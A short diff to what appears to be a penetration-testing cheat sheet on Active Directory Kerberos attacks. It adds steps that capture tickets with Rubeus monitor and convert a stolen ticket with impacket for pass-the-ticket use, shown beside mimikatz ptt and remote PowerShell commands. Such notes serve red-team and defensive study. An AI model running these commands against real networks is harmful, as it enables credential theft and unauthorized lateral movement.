@@ -205,6 +205,16 @@ kerberos::ptt "$TICKET_PATH.kribi"
 Enter-PSSession -ComputerName $COMPUTER_NAME
 ```
 
+- You can also monitor Kerberos tickets using Rubeus:
+
+```
+Rubeus.exe monitor /interval:1
+
+# Now use the ticket
+cat ticket | base64 -d > $USER.kribi
+impacket-ticketConverter $USER.kribi $USER.ccache
+```
+
 - From linux host:
 
 ```shell
